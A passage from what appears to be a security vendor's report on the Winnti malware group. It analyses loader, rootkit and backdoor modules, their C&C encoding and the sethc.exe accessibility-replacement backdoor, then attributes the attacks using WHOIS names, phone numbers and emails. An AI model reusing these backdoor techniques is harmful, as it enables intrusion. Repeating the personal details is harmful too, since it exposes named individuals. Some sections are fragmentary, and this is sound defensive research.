module file path to the registry in the following key location: HKCU\Software\Classes\path and starts a new
process from there.</section>
<section>
<heading>c_20100.NLS (aka SrvCore.dll) File</heading>

Size: 15847156
MD5: 5778178a1b259c3127b678a49cd23e53
Location: C:\WINDOWS\system32\c_20100.NLS
Creation time (UTC): unavailable
Link time (UTC): 2011-09-16 13:23:34
</section>

<noncontent>PAGE 38| “Winnti” | More than just a game</noncontent>
<section>
<heading>Summary</heading>

c_20100.NLS works in two modes.The first mode is a load as a dynamic library and the second is a launch as a
service.Both branches have the same core functionality.This module is a universal executable code loader with no embedded payload.Its main purpose is to connect to the
C&C server, download and store the encrypted payload in the system registry.It is also responsible for loading,
decrypting and running the payload module from the registry after system restart.</section>
<section>
<heading>Details</heading>
c_20100.NLS contains a ciphered block with initial settings.This ciphered block resides at the very end of the file of
this malicious program and is decrypted in the beginning of execution.Structure of block:



<figure></figure>
                                            <caption>Initial settings in the end of file</caption>

The malicious program XORs the magic number with a hardcoded value 0x19860609, converts a resulted value into
a HEX-string and uses that string as a key for RC4 cipher algorithm.In this case string-key represents “00000000”
because of the magic number is equal to the hardcoded XORing value.With that key malicious program decrypts
(RC4) ciphered archive.The archive has the following data:



<figure></figure>
                                               <caption>Archive of initial settings</caption>

Custom LZ-like compression algorithm resembling was used to pack initial settings.After unpacking the following
data appears:




<noncontent>PAGE 39| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                                 <caption>The Initial settings</caption>

The malicious program tries to read registry value “SrvCode” by registry path:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion.That value is expected to contain ciphered with RC4 data.To decrypt it program uses 2nd integer of initial settings (in this case 0x3514) XORed by hardcoded byte 0x12.Result
is converted into a HEX-string and is used as RC4 key for further decryption (here it is “00003506”).That registry
value appears if this malicious program had already worked on the system and received data from the C&C server
in the past.Content of “SrvCode” poses a ciphered executable which should be loaded into the memory and run.If “SrvCode” is not found malware makes attempts to connect to one of the specified C&C servers.</section>



<noncontent>PAGE 40| “Winnti” | More than just a game</noncontent>
<section>
<heading>C&C Server Address Selection</heading>

Initial settings define the type of C&C format.Byte at offset 0x24C stores the C&C type value:

0x00: the malware uses 4 URL-based C&Cs placed at 0x4C, 0x8C, 0xCC and 0x10C offsets.By all appearances these
are public resources (forums, blog platforms and so on) where the attackers leave messages with specially crafted
content for a bot.If connection fails, the malware tries another approach.0x01: the malware uses attackers’ hardcoded servers and connects to host and port specified at offsets: 0x14C,
0x18C, 0x1CC and 0x20C.If connection fails the malware tries another approach.If URL-based scheme is used then malware loads a web-page by specified in settings URL.The target text has to
begin and end with special hardcoded delimiters: “B9273C17” – start, “B6A74634” – end.The malware reads
contents of the webpages until it finds a proper page with delimiters.If found, the malware takes the text between
delimiters and treats it as data of hex string, converts it to the binary data and decrypts resulted data using RC4
algorithm with hardcoded key “rtyr_45_trf”.For example:

“B9273C17E67024277AE02E2A8A780B243C0BCA88FE85A1B6A7463”,

The data between delimiters:

“E67024277AE02E2A8A780B243C0BCA88FE85A1”,

It is converted into binary: 0xe6 0x70 0x24 … 0xa1 and this buffer is decrypted with RC4 key “rtyr_45_trf”.Result is
a host and port of C&C: “nx2.intercpu.com:25”.If the host-port schema is used then malware simply connects to the hardcoded C&C servers directly.</section>
<section>
<heading>Communication with C&C Server</heading>

Once a working C&C server is found the malware sends specially crafted ciphered buffer to via TCP/IP.On request
from a bot a C&C server replies with several blocks of data described below:

1st block

0xC bytes of header: 0x1000010, 0x1000010, <reserved 4 bytes>.2nd block

0x1C bytes (due to absence of real respond from the C&C I’m presenting an example buffer of this block containing
bytes 0x00, 0x11, 0x22, … , 0xFF, 0x00, 0x0, 0x0, …, 0x00):



<figure></figure>
                                            <caption>2nd block of 0x1c bytes: example</caption>

First DWORD of this buffer (here, 0x33221100) is a magic number which is XORed with the value 0x1986052.Resulted lowest byte is used to XOR unpacked data.<noncontent>PAGE 41| “Winnti” | More than just a game</noncontent>
Word at offset 0x4 (here, 0x5544) poses a checksum of unpacked data which should correspond with actual
received content.DWORD starting at offset 0x8 (here, 0xBBAA9988) represents a size of unpacked data.Value at marked place at 0xC offset (in example picture it is dword 0xFFEEDDCC) represents a size of next block of
data to be received.That data will pose an archive, hence this value represents a size of packed data.3rd block

The 3rd block poses an archive of ciphered data.Being received, unpacked and decrypted, data is ciphered again
with RC4 and stored into “SrvCode” value of registry by mentioned above registry path.The eceived data is processed as an executable file to run.The malware places the executable in memory,
prepares for running and makes call to the entry point of the new code.Then it waits when following event will be
triggered:

Global\D5ACF9F6-C8B3-47d1-9768-57162E1F5FDB

When triggered, the malware finishes execution.During the process of finishing it deletes registry value “SrvCode”
along with values “DrvCode” and “KeyCode” from the same registry path although this malware was not creating
them.</section>
<section>
<heading>Tcprelay.sys File</heading>

Size: 99912
MD5: 0b105cd6ecdfe5724c7db52135aa47ef
Location: C:\WINDOWS\system32\drivers\tcprelay.sys
Creation time (UTC): 2012-09-05 17:27:04
Link time (UTC): 2011-12-21 13:55:03

This file is a Microsoft Windows native application, which is loaded as a driver and had a valid digital signature in
2012.The certificate was issued by LivePlex Corp, which can be found online by searching for the company name.Then the driver sets up some rootkit functionality to hide TCP connections by patching the
system tcp/ip driver.The injected DLL was called s.dll at the time of compilation and is yet another module for analysis.</section>
<section>
<heading>S.dll File</heading>

Size: 77825
MD5: 1716889fcee461e7cde5128c14d206cb
Location: inside tcprelay.sys
Creation time (UTC): 2012-09-05 17:27:04
Link time (UTC): 2011-03-01 09:07:12

This opens system event named “401d-b49a-93cf7a18e5b3” and sets event to fired state if it exists.The code
checks for proxy server configuration by impersonating a logged in user and fetching settings from the registry.It
can work both with Socks and HTTP proxies.The module attempts to connect to the list of 8 domains, consisting of
the following command and control servers (some of them are used more than once):

        a1.googletrait.com
        a1.nexongame.net
        a1.reegame.net
        mail.nexongame.net

It automatically looks for open C&C ports in the following order 53,443,8080,25,80,3690,1433,80.During connection over HTTP proxy it uses the following User-Agent string: “MyApp/0”.The application is linked with libmysql.dll and Zlib (v.1.2.3).Current Zlib version is 1.2.7 and was released on 2nd
May 2012, while version 1.2.3 seems to be released in July 2005.Zlib version 1.2.4 was released on March 2010, so
the original module was probably designed somewhere after July 2005 and before March 2010.The block is
compressed using Zlib (v.1.2.3) compress2 method with compression level 8.The data is compressed later and
prepended by a 4-bytes header as shown below.<figure></figure>
                                            <caption>Format of a message sent to C&C</caption>

After submitting system information the module expects 4 byte response code from the server after which it sends
one 00 byte to complete the handshake procedure.Then the module expects an interactive communication session with the remote operator.To summarize, it is
obvious that this executable module is a backdoor, capable of taking screenshots, stealing files, downloading new


<noncontent>PAGE 45| “Winnti” | More than just a game</noncontent>
files from the Internet, starting and killing processes, including interactive Windows shell commands, file search
and interaction with mysql database server.The file C:\WINDOWS\system32\sethc.exe (SET High Contrast) is to enable the High Contrast accessibility feature in
order to allow people with visual impairments to log in.SETHC is activated at logon screen with
LeftAlt+LeftShift+PrintScreen key combination.By replacing C:\Windows\SYSTEM32\SETHC.EXE with a custom application an attacker can run an arbitrary
application with SYSTEM privileges running in zero session (in separate desktop space from normal applications).After the new file replaced the system sethc.exe application, current module adjusts the privileges of sethc.exe to
disable access to the file from any other application.This is achieved by calling external system tools cacls.It is set identical to C:\WINDOWS\system32\ntvdm.exe.The dropper application has a resource section with Menu, Dialog templates and other information put by the MS
Visual Studio Application Wizard.It includes default system locale from the developer's system, which is Chinese
Simplified.<figure></figure>
                                        <caption>Chinese locale in resource section of En.exe</caption>

The dropped application (from resource EXEFILE) is described below as sethc.exe.</section>
<section>
<heading>Sethc.exe File</heading>

Size: 20480
MD5: 3ba06424e8244f17a8d269c4d40c39c9
Location: resource section of En.exe
Link time (UTC): 2009-05-16 07:09:35

This small file has very basic functionality.It is written using MS Visual C++ with MFC and is used to render a simple
dialog window.Like En.exe it has resource section, describing the dialog window and default locale is set to
Chinese Simplified.Once it replaced local system sethc.exe tool it can be invoked when the desktop is locked with
LeftCtrl+LeftShift+PrintScr key combination.This brings a dialog Window similar to system StickyKeys application.However, if you press Ctrl+Alt+F you will immediately see a hidden input box.If you enter “ydteam” in the input
box and press Ctrl+Alt+K, the application will welcome you with a message box and will execute a TaskManager.<noncontent>PAGE 48| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                        <caption>Fake SetHighContrast application in action</caption>

As far as sethc.exe is executed with privileges of local system, the task manager also inherits these privileges and is
capable of killing any other process as well as starting any other application with system rights.Apparently, this is a
backdoor to the system.An attacker can run cmd.exe, add local users with administrative privileges and log in.We
checked if the tool was publicly shared on the Internet, but couldn't find a page distributing it freely.That is why
we assume that it is developed and used privately.This means that at least the individual who owns
awertasegfae@yahoo.com for sure belongs to the same gang who attacked CompanyXYZ.</section>



<noncontent>PAGE 50| “Winnti” | More than just a game</noncontent>
<header>Source of Attacks</header>
<section>
So, who is behind Winnti?While analyzing the malicious files that we detected during our investigations we found
some details which may cast some light on the source of the attacks.As part of our investigation, we monitored exactly what the cybercriminals did on an infected PC.In particular, they
downloaded an auxiliary program ff._exe to the Config.Msi folder on the infected machine.This code searches for
HTML, MS Excel, MS Word, Adobe, PowerPoint and MS Works documents and text files (.txt) on the hard drive.Debugging lines were found in ff._exe_ that possibly point to the nationality of the cybercriminals.They were not
immediately noticeable because they looked like this in the editor:

<figure></figure>


However, during a detailed analysis it emerged that the text is in Chinese Simplified GBK coding.This is a program with a Chinese interface.Chinese text was also found in one of the components of the malicious program CmdPlus.dll plug-in:



<figure></figure>
                                           <caption>Translation: The process is complete!!</caption>

It would appear that the attackers can at least speak Chinese.However, not everything is so clear cut: because the
file transfer plug-in has not been implemented entirely safely, a command which includes the attackers’ local path
(where the file comes from and where it is saved to) arrives during the process of downloading/uploading files on
the infected system.While monitoring the cybercriminals’ activity on the infected machine, we noticed they
uploaded the certificate they found in the infected system, and the network traffic reflected the local path
indicating the place where they saved the file on their computer:




These characters appear to be Korean, meaning “desktop”.This means the attackers were working on a Korean
Windows operating system.Therefore, we can presume that the attack is not exclusively the work of Chinese-
speaking cybercriminals.</section>



<noncontent>PAGE 52| “Winnti” | More than just a game</noncontent>
<header>The Search for Attackers (XYZ incident)</header>
<section>
Locating the attacker is one of the most non-trivial parts of the research.The attackers normally do not leave any
traces in the malware that can be directly bound to their real identities.That is why we have to use all available
bits of information that seems to find other unique related content on the Internet or any other available data
sources.One of the important stages is to extract unique identifiers/nicknames/tags that can be discovered on the
Internet and after that find individuals who are related to creation or distribution of this content.</section>
<section>
<heading>YDTeam Hacking Group</heading>

The string “ydteam” looked non-random and we decided to check it on the Internet.According to the
domaintools.com database, it was registered on 2009-10-06 15:12 and put on hold around 2010-10-08.The domain was most likely registered by the team leader.The email itself was used on several other websites.For example
<list>
        http://tieba.baidu.com/f?ct=335544320&lm=0&rn=30&tn=baiduPostBrowser&sc=0&z=633089789&pn=0&
        word=%BC%AF%C4%FE%D2%BB%D6%D0
</list>
The webpage above has a post offering to “help with cheap shopping online”.That is most likely related to a
fraudulent activity of the email owner (stolen Internet-banking credentials or credit card information).After that WHOIS information was protected by a Privacy protection service.Here is WHOIS data at the time of
domain registration:
<list>
Admin Name........... zheng wenlong
Admin Address........ tianjin jiefangdongjie 63hao
Admin Address........ yancheng
Admin Address........ 300560
Admin Address........ fujian
Admin Address........ CHINA
Admin Email.......... vydteam@yahoo.cn
Admin Phone.......... +86.13652452428
</list>
Please note, that +8613652452428 is a Chinese local cell phone number.Domaintools.com has also preserved a screenshot of the website while it was online on 2010-02-25.It shows some
of the team member names mentioned above.<noncontent>PAGE 55| “Winnti” | More than just a game</noncontent>
<figure></figure>
                                            <caption>Ydteam website as it was in 2010</caption>

Another trace to the source of attack is based on email sender IP address.The emails were sent from
118.142.11.114.This was tank.hja63.com.</section>


<noncontent>PAGE 57| “Winnti” | More than just a game</noncontent>
<section>
<heading>Bot Control Messages On Public Resources</heading>

Analysis of the file c_20100.nls revealed additional information leading to probable attackers.Google Search for the nickname
“mer4en7y” returned 5490 results.This is a very active user that posts messages for this type of bot.The first
results lead to hacker forums and IT-security specific web-platforms.The same nickname has appeared on a well-
known Romanian Security Team forum.<figure></figure>
                                     <caption>A trace of cyberattack based on Mer4en7y's code</caption>

As we can see here Mer4en7y had an email address associated with 90sec hackers team.Another reference on the net shows that Mer4en7y is after sourcecode of proprietary products (probably udf.dll
from Roxio Inc):

http://www.uedbox.com/udf-dll-source/



<figure></figure>
                               <caption>Mer4en7y discussing udf.dll source-code and cmdshell</caption>




<noncontent>PAGE 65| “Winnti” | More than just a game</noncontent>
The following confirms that Mer4en7y is a member of 90sec group.Full target penetration alone or with a team depending on available resources;
    2.Penetration testing report and recommendations

Technical requirements:

    1.Knowledge of penetration testing, methods, processes, proficiency in a variety of penetration testing tools;
    2.Knowledge of common Web development languages (asp, php, jsp), experience with SQL-injection, XSS,
       common websecurity exploits and patches;
    3.Experience with all kinds of operating systems and databases for common security vulnerabilities;
    4.Good verbal and written language skills ;
    5.Be able to work in a team; individuals who lose trust, do not listen to the teamleader and not accepting the
       rules will be kicked out;



<noncontent>PAGE 66| “Winnti” | More than just a game</noncontent>
Work Location: Guangdong (OR Guangzhou Shenzhen)

Baochibaozhu package, Relatively free playing time.Salary: monthly allocation of the total amount of work and cooperation share more than 1W.Vacancies: 5 people
For candidates: first contact me (preferably work resume), after my check the resume will be passed to the head
coordinator for arranging a personal meeting.Salary: free meal and apartments, office location is in a senior villa suite of 200 square meters, computers are
available but please bring your own hard drive with environment and tools you are familiar with.Even a single
completed project will provide you with money for your monthly expenses.Powerful background.No comments!Tho who are competent, please contact:
Email: Infosec@cntv.cn QQ: admin@inessus.com”

And Mer4en7y’s replied to this job offer:



<figure></figure>
                                        <caption>Mer4en7y's comment about job offer</caption>

Which can be translated as: “Aren’t you recruiting people for APT?Guangzhou is too far, but anyway I support it”.There are some interesting comments in the mentioned forum thread regarding reference “Powerful background”
in job offer.People in the thread speculated that it could mean the work is supported by the government.The very first one is labeled as “first home”/ “first love” and contains a ciphered
C&C domain as described above, i.e.C&C domain is encrypted with RC4 algorithm and its hex binary value is
presented in text format between delimiters.But the next message dubbed “second” contains a ciphered C&C domain too but it is encoded in another way: The
initial C&C domain is XORed with fixed byte value and the resulted data is transformed using BASE64 encoding.The
resulted text is inserted between the same delimiters.By all appearances this method is used in the next version of
the backdoor which is the subject of current research (see c_20100.NLS).It is also possible that programs with
support of either this or that encryption could be used simultaneously in the frame of one attack.Between all
found messages for the bot the second type of messages (BASE64) is significantly prevalent.A link to this “Jimycocowell home” is also present at following place of “bitgodgod” user:
http://www.blogger.com/profile/06442609461818597659



<figure></figure>
                                            <caption>Jimmycocowell registration date and alias</caption>
</section>
<section>
<heading>Bitgodgod and Bitbugbug</heading>

We have located one sample of Winnti malware with a hardcoded C&C: mail.7niu.com.Both are directly related to Winnti activity.The email address “bit_bugbug@tom.com” also can be found on Chinese websites about home rentals:

http://oldhouse.0379home.com/RentView-1108.html

<figure></figure>
</section>



<noncontent>PAGE 72| “Winnti” | More than just a game</noncontent>
<section>
<heading>Yang Individual Activity</heading>

We have located another individual calling himself Yang.He distributed bot control commands and was quite
active on the internet as well.These attacks are not new, many other security researchers have published details of various cybercriminal
groups coming from China.The Winnti hacking group is not the first and not the last.By making our research paper available to the public, we
hope that it will not only spread the knowledge among security researchers but also will help system
administrators and security officials in all type of organizations around the world to learn the tactics and tools of
the perpetrators.We hope that our shared knowledge will help to better protect IT infrastructure.We also hope
that our message will reach Chinese law enforcement agencies.If the current research is not enough to initiate
criminal investigation, we hope that it will be enough at least to make some checks and probably prevent other
malicious activity from reaching out foreign countries and business within China.